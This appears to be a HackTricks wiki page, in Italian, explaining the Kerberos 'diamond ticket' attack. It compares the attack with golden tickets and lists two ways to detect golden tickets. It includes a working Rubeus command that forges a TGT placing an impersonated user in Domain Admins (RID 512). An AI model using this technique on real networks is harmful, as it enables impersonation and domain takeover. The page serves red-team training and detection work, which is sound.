# Diamond Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Diamond Ticket

**Come un biglietto d'oro**, un biglietto di diamante è un TGT che può essere utilizzato per **accedere a qualsiasi servizio come qualsiasi utente**. Un biglietto d'oro è forgiato completamente offline, crittografato con l'hash krbtgt di quel dominio, e poi passato in una sessione di accesso per l'uso. Poiché i controller di dominio non tracciano i TGT che hanno legittimamente emesso, accetteranno felicemente i TGT crittografati con il proprio hash krbtgt.

Ci sono due tecniche comuni per rilevare l'uso di biglietti d'oro:

* Cerca TGS-REQ che non hanno un corrispondente AS-REQ.
* Cerca TGT che hanno valori ridicoli, come la durata predefinita di 10 anni di Mimikatz.

Un **biglietto di diamante** è creato **modificando i campi di un TGT legittimo emesso da un DC**. Questo si ottiene **richiedendo** un **TGT**, **decrittografandolo** con l'hash krbtgt del dominio, **modificando** i campi desiderati del biglietto, e poi **ri-cifrando**. Questo **supera i due difetti sopra menzionati** di un biglietto d'oro perché:

* I TGS-REQ avranno un AS-REQ precedente.
* Il TGT è stato emesso da un DC, il che significa che avrà tutti i dettagli corretti dalla politica Kerberos del dominio. Anche se questi possono essere forgiati accuratamente in un biglietto d'oro, è più complesso e soggetto a errori.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}
